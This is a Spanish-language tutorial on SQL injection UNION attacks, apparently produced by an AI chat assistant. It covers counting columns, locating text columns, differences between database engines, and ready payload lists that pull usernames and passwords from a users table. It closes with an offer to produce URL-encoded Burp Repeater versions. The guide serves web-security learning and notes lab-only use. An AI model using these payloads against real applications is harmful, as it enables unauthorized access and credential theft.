# UNION attacks

Cuando una aplicación es vulnerable a SQL injection **y** la salida de la consulta original se refleja en la respuesta HTTP, puedes inyectar un `UNION SELECT` para añadir filas controladas por ti al conjunto de resultados. Esto permite recuperar datos de otras tablas si consigues que la consulta inyectada tenga la misma estructura (nº de columnas y tipos compatibles) que la consulta original.

Ejemplo conceptual:

```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2;
```

El resultado es un único conjunto con dos columnas, combinando valores de `a,b` y `c,d`.

table1
| a | b |
| - | - |
| 1 | 2 |
| 3 | 4 |

table2
| c | d |
| - | - |
| 2 | 3 |
| 4 | 5 |

Consulta 1:
```sql
SELECT a, b FROM table1;
```
| a | b |
| - | - |
| 1 | 2 |
| 3 | 4 |

Consulta 2:
```sql
SELECT a, b FROM table1 UNION SELECT d, d FROM table2;
```
| a | b |
| - | - |
| 1 | 2 |
| 3 | 4 |
| 3 | 3 |
| 5 | 5 |



---

## Requisitos para que `UNION` funcione

1. **Mismo número de columnas** en cada `SELECT`.
2. **Tipos compatibles** entre columnas en cada posición (o convertibles).

Por eso la primera tarea al explotar un `UNION` es averiguar cuántas columnas devuelve la consulta original y cuáles de esas columnas pueden contener datos de tipo texto (string) donde poner tu payload.

---

## 1) Determinar cuántas columnas devuelve la consulta

Hay dos técnicas comunes.

### A — `ORDER BY` por posición

Inyectás `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3`, ... hasta que obtengas un error o un comportamiento diferencial. El primer `n` que falle indica que la consulta original tiene `n-1` columnas.

Payloads (si la aplicación ya envuelve el input con comillas):

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Si la app no muestra errores explícitos, observá diferencias en la respuesta (código, tamaño, contenido).

### B — `UNION SELECT NULL,...` (prueba por conteo)

Inyectás `UNION SELECT NULL`, `UNION SELECT NULL,NULL`, etc., hasta que el `UNION` deje de fallar. Usamos `NULL` porque es convertible a la mayoría de tipos y minimiza errores de tipo.

Payloads (string context):

```
' UNION SELECT NULL--              -- prueba 1 columna
' UNION SELECT NULL, NULL--        -- prueba 2 columnas
' UNION SELECT NULL, NULL, NULL--  -- prueba 3 columnas
```

**Nota importante (Oracle):** Oracle no permite `SELECT <literal>` sin `FROM`. En Oracle debes usar `FROM DUAL`:

```
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL, NULL FROM DUAL--
```

Si el `UNION` coincide con las columnas, verás una fila adicional (posiblemente con `NULL` en cada columna) o alguna diferencia en la respuesta.

`Nota`: Los payloads descritos utilizan la secuencia de comentarios de doble guion `--` para comentar el resto de la consulta original después del punto de inyección. En MySQL, la secuencia de doble guion debe ir seguida de un espacio. Como alternativa, se puede utilizar `#`

---

## 2) Encontrar columnas adecuadas para datos de texto

Una vez sabes el número de columnas `N`, debes probar qué columnas aceptan texto. Envía una serie de payloads donde pones una cadena identificadora (`'injected1'`) en cada posición y `NULL` en las demás:

Por ejemplo, si hay 4 columnas:

```
' UNION SELECT 'a', NULL, NULL, NULL--
' UNION SELECT NULL, 'a', NULL, NULL--
' UNION SELECT NULL, NULL, 'a', NULL--
' UNION SELECT NULL, NULL, NULL, 'a'--
```

Si alguna de esas consultas no da error y la respuesta HTTP contiene la cadena `a` (por ejemplo en una celda de la tabla HTML), entonces esa posición es interesante para inyectar texto real (username, password, etc.).

Si al ejecutar el payload aparece un error del tipo "Conversion failed when converting the varchar value 'a' to data type int", entonces la posición no admite texto (la columna es numérica).

---

## 3) Exfiltrar datos con `UNION` una vez que conocemos columnas y tipos

Si sabes que la consulta original tiene 2 columnas y ambas admiten texto, y existe una tabla `users(username,password)`, un payload será:

```
' UNION SELECT username, password FROM users--
```

Si sólo la 2ª columna es visible y admite texto, y la original tiene 3 columnas, coloca los datos en la 2ª posición:

```
' UNION SELECT NULL, username || ':' || password, NULL FROM users--   -- Oracle (|| concatenation)
' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users-- -- MySQL (CONCAT)
```

Si desconocés los nombres de tabla/columnas, primero harás *enumeración* usando `information_schema` (MySQL/Postgres/SQL Server) o `all_tables` / `all_tab_columns` en Oracle.

---

## 4) Particularidades por base de datos

* **MySQL**: permite `UNION SELECT NULL` sin `FROM`. Comentarios: `-- ` necesita espacio; `#` también funciona. Uso frecuente de `GROUP_CONCAT` y `CONCAT`.
* **PostgreSQL**: permite `UNION SELECT NULL` y usa `||` para concatenar; también `string_agg` para agrupar.
* **Microsoft SQL Server**: `@@version`, `+` o `CONCAT()` para concatenar, `WAITFOR DELAY` para time-based.
* **Oracle**: **obligatorio** `FROM DUAL` si seleccionás literales; concatenación con `||`. Para `UNION` con literales: `SELECT 'a' FROM DUAL`.
* **SQLite**: admite `UNION SELECT NULL` y `||` para concatenación; metadatos en `sqlite_master`.

---

## 5) Recuperar múltiples valores en una sola columna (concatenación)

Si sólo hay 1 columna disponible, puedes concatenar varias columnas en una sola cadena separada por un separador reconocible:

* **Oracle:** `username || '~' || password`
* **MySQL:** `CONCAT(username, '~', password)` o `GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR ',')` para unir múltiples filas.
* **Postgres:** `username || '~' || password` o `string_agg(username || ':' || password, ',')`

Ejemplo Oracle con `UNION` (1 columna visible):

```
' UNION SELECT username || '~' || password FROM users--
```

---

## 6) Payloads útiles (listas) — genéricas y por SGBD

**Detección de número de columnas (general):**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

**Prueba por `UNION NULL` (MySQL/Postgres/SQL Server/SQLite):**

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

**Prueba `UNION NULL` en Oracle (usar DUAL):**

```
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL, NULL FROM DUAL--
```

**Identificar columna visible (ej. 4 columnas):**

```
' UNION SELECT 'c1', NULL, NULL, NULL--
' UNION SELECT NULL, 'c2', NULL, NULL--
' UNION SELECT NULL, NULL, 'c3', NULL--
' UNION SELECT NULL, NULL, NULL, 'c4'--
```

**Exfiltrar (ej. 2 columnas, MySQL):**

```
' UNION SELECT username, password FROM users--
```

**Exfiltrar en 1 columna concatenada (Oracle):**

```
' UNION SELECT username || '~' || password FROM users--
```

**Exfiltrar varias filas en una sola célula (MySQL):**

```
' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR ',') FROM users--
```

---

## 7) Consejos prácticos y trucos

* **Determina primero el motor**: si ves errores con `ORA-` o `SQLSTATE`, adapta payloads (DUAL, funciones, concatenadores).
* **Usa `NULL` al principio** para contar columnas y evitar errores de tipo. Luego prueba literales para identificar columnas de texto.
* **Identifica qué columna aparece en la página** reemplazando `NULL` por marcadores (`'col2_marker'`) y buscando en la respuesta HTML.
* **Si la app suprime errores**, inspecciona diferencias en longitud/respuesta o usa inyección ciega (time/boolean).
* **Evita payloads destructivos** en entornos reales. Solo en labs o con autorización.
* **Si `UNION` está bloqueado**, prueba técnicas de subqueries, error-based o time-based para enumerar la base.

---



¿Querés que suba esto al lienzo como archivo `SQLi_UNION_attacks.md` (ya lo creé) y además genere una versión con ejemplos listos para Burp Repeater codificados (URL-encoding) para MySQL y Oracle?"}
